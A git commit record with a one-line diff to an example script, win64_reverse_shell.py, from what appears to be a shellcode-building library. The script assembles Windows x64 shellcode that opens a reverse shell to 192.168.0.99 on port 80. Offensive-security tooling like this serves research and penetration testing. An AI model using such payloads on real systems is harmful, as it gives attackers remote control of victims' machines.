fc52d714050748b2932dbbf2a29a6f2d5602d5d6
Niklas Baumstark <niklas.baumstark@gmail.com>
2018-07-04 15:00:44 +0200

    fix example

--- examples/win64_reverse_shell.py
+++ examples/win64_reverse_shell.py
@@ -3,7 +3,7 @@ from pwnlib.tools import *
 
 s = ''
 s += code_align_stack64
-s += resolve64(reverse_shell64('192.168.0.99', 80))
+s += reverse_shell64('192.168.0.99', 80)
 s += api_call_stub64
 
 sc = x86_64.assemble(s)
